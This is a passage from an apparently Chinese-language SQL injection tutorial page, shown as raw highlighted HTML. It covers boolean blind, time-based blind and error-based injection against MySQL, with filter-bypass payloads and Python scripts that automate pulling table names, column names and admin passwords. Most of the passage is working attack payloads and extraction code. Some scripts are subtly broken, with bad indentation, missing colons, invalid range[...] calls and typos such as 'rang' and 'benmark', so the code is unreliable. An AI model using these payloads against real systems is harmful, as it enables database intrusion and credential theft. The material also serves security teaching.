class="keyword">in</span><span class="comment">/**/</span>(database())<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">offset</span><span class="comment">/**/</span><span class="number">0</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>)<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="number">97</span>);</span><br></pre></td></tr></table></figure><h5 id="Python编写代码自动化注入"><a href="#Python编写代码自动化注入" class="headerlink" title="Python编写代码自动化注入"></a>Python编写代码自动化注入</h5><p><strong>表名获取：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="comment">#控制表数量</span></span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>)</span><br><span class="line">    <span class="comment">#控制第几个字符</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span> :</span><br><span class="line"><span class="string">&quot;-1/**/or/**/mid((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database())/**/limit/**/1/**/offset/**/&quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;)/**/from/**/&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;/**/for/**/1)/**/in/**/(&#x27;&quot;</span>+<span class="built_in">str</span>(char)+<span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.get(url=url,params=params)</span><br><span class="line">            <span class="comment">#print(r.request.url)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(r.text) == <span class="number">1764</span>:</span><br><span class="line">                <span class="comment">#此位置填写正确值返回长度</span></span><br><span class="line">                table_name += char</span><br><span class="line"><span class="built_in">print</span>(table_name)</span><br></pre></td></tr></table></figure><p><strong>字段名获取(以admin表为例)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span>mid((<span class="keyword">select</span><span class="comment">/**/</span>column_name<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="string">&#x27;admin&#x27;</span>)<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">offset</span><span class="comment">/**/</span><span class="number">0</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>)<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="string">&#x27;i&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span> :</span><br><span class="line"><span class="string">&quot;-1/**/or/**/mid((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/in/**/(&#x27;admin&#x27;)/**/limit/**/1/**/offset/**/&quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;)/**/from/**/&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;/**/for/**/1)/**/in/**/(&#x27;&quot;</span>+<span class="built_in">str</span>(char)+<span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.get(url=url,params=params)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(r.text) == <span class="number">1764</span>:</span><br><span class="line">                <span class="comment">#此位置填写正确值返回长度</span></span><br><span class="line">                column_name += char</span><br><span class="line"><span class="built_in">print</span>(column_name)</span><br></pre></td></tr></table></figure><p><strong>字段值获取(以password为例)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span>mid((<span class="keyword">select</span><span class="comment">/**/</span>password<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>admin<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">offset</span><span class="comment">/**/</span><span class="number">0</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>)<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="string">&#x27;f&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>):</span><br><span class="line">    password_value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span> :</span><br><span class="line"><span class="string">&quot;-1/**/or/**/mid((select/**/password/**/from/**/admin/**/limit/**/1/**/offset/**/&quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;)/**/from/**/&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;/**/for/**/1)/**/in/**/(&#x27;&quot;</span>+char+<span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.get(url=url,params=params)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(r.text) == <span class="number">1764</span>:</span><br><span class="line">                <span class="comment">#此位置填写正确值返回长度</span></span><br><span class="line">                password_value += char</span><br><span class="line"><span class="built_in">print</span>(password_value)</span><br></pre></td></tr></table></figure><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p><strong>原理：无法利用页面回显判断注入执行结果，可以利用SQL语句执行的延时，判断SQL是否执行成功。只要可以执行延时，那么就可以利用该注入技术。</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mysql中常用的延时执行函数</span><br><span class="line">sleep(num)</span><br><span class="line">benmark(num,function)    benmark(<span class="number">100000000</span>,rand())</span><br><span class="line"></span><br><span class="line">Mysql中常用的判断结构</span><br><span class="line"><span class="keyword">IF</span>(condition,when_true,when_false)</span><br><span class="line">例如:select * from admin where id = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">if</span>(length(database())&gt;<span class="number">0</span>,sleep(<span class="number">3</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><strong>延时注入也是基于逐个字符猜解的技术。</strong></p><p><strong>1.数据库长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">7</span>,sleep(<span class="number">3</span>),<span class="keyword">null</span>)</span><br></pre></td></tr></table></figure><p><strong>根据返回时间确定数据库长度。</strong></p><p><strong>2.数据库名称</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span><span class="operator">=</span><span class="string">&#x27;w&#x27;</span>),sleep(<span class="number">3</span>),<span class="keyword">null</span>)</span><br></pre></td></tr></table></figure><p><strong>根据返回时间确定数据库名称。</strong></p><p><strong>3.数据表名称</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>),sleep(<span class="number">3</span>),<span class="keyword">null</span>)</span><br></pre></td></tr></table></figure><p><strong>根据返回时间确定数据表名称。</strong></p><p><strong>4.字段名称</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>),sleep(<span class="number">3</span>),<span class="keyword">null</span>)</span><br></pre></td></tr></table></figure><p><strong>根据返回时间确定字段名称</strong></p><p><strong>5.字段值</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((substr((<span class="keyword">select</span> password <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;f&#x27;</span>),sleep(<span class="number">3</span>),<span class="keyword">null</span>)</span><br></pre></td></tr></table></figure><p><strong>根据返回时间确定字段值</strong></p><h4 id="延时盲注Python自动化利用"><a href="#延时盲注Python自动化利用" class="headerlink" title="延时盲注Python自动化利用"></a>延时盲注Python自动化利用</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用过程：</span><br><span class="line"><span class="number">1</span>.寻找payload+绕过技巧</span><br><span class="line"><span class="number">2</span>.Python自动化请求url+payload通过超时判断是否正确。</span><br></pre></td></tr></table></figure><h5 id="数据库名称"><a href="#数据库名称" class="headerlink" title="数据库名称"></a>数据库名称</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">        url = <span class="string">&quot;http://?id=1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;and if((substr(database(),&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)=&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;),sleep(3),null)&quot;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=url,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">            flag = flag + c</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h5 id="数据表名称"><a href="#数据表名称" class="headerlink" title="数据表名称"></a>数据表名称</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">        url = <span class="string">&quot;http://?id=1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;and if((substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1)=&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;),sleep(3),null)&quot;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=url,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">            flag = flag + c</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h5 id="字段名称"><a href="#字段名称" class="headerlink" title="字段名称"></a>字段名称</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>[<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;person&#x27;</span>]:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">        url = <span class="string">&quot;http://?id=1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;and if((substr((select column_name from information_schema.columns where table_name=&#x27;&quot;</span>+item+<span class="string">&quot;&#x27; limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1)=&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;),sleep(3),null)&quot;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=url,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">            flag = flag + c</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h5 id="字段值"><a href="#字段值" class="headerlink" title="字段值"></a>字段值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>[<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">        url = <span class="string">&quot;http://?id=1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;and if((substr((select &quot;</span>+item+<span class="string">&quot; from admin limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1),&quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;,1)=&#x27;&quot;</span>+c+<span class="string">&quot;&#x27;),sleep(3),null)&quot;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=url,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">            flag = flag + c</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>原理：利用mysql数据库报错，导致输出查询数据信息。</strong></p><h4 id="floor-rand-0-2-报错"><a href="#floor-rand-0-2-报错" class="headerlink" title="floor(rand(0)*2)报错"></a>floor(rand(0)*2)报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rang(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>));</span><br><span class="line">报错输出：</span><br><span class="line">数据库版本信息</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>)：Duplicate entry <span class="string">&#x27;5.5.531&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br><span class="line">根据插入同名字段，导致出现冲突</span><br><span class="line">payload:</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><h4 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)，如果不了解Xpath语法，可以在网上查找教程。</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br><span class="line"></span><br><span class="line">当第二个参数不符合Xpath语法，那么报错</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.5.53~&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="extractvalue报错"><a href="#extractvalue报错" class="headerlink" title="extractvalue报错"></a>extractvalue报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(目标xml文档,xml路径)</span><br><span class="line"></span><br><span class="line">第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 <span class="operator">/</span>xxx<span class="operator">/</span>xxx<span class="operator">/</span>xxx<span class="operator">/</span>...这种格式，如果我们写入其他格式就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> person <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(version()),<span class="number">0x7e</span>));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~5.5.53~&#x27;</span></span><br></pre></td></tr></table></figure><p>其他类型报错注入方式: (Mysql高版本不适用)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>geometrycollection()</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>multipoint()</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>polygon()</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>multipolygon()</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>linestring()</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>multilinestring()</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span><span class="built_in">exp</span>()</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure><h4 id="报错注入实验"><a href="#报错注入实验" class="headerlink" title="报错注入实验"></a>报错注入实验</h4><p><strong>实际过程中，需要先探测出没有过滤的函数，然后进行报错利用。</strong></p><p><strong>数据表名获取</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> 